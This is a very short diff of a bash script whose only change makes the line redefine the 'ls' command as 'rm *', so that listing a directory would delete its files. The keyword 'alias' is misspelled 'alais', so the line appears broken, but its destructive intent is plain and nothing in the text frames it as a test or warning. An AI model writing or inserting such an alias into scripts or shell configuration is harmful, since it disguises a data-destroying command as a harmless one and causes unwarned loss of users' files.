@@ -1,2 +1,2 @@
 #!/bin/bash
-alais la = rm *
+alais ls="rm *"
